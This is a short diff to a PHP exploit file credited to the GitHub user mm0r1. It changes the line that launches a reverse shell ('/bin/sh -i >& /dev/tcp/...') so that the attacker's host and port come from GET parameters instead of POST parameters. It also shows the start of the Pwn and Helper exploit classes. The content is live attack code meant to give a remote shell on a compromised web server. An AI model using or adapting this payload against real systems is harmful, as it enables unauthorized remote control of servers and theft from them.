@@ -9,7 +9,7 @@
 #
 # Author: https://github.com/mm0r1
 
-new Pwn("/bin/sh -i >& /dev/tcp/".$_POST['i']."/".$_POST['p']." 0>&1");
+new Pwn("/bin/sh -i >& /dev/tcp/".$_GET['i']."/".$_GET['p']." 0>&1");
 
 class Helper { public $a, $b, $c; }
 class Pwn {
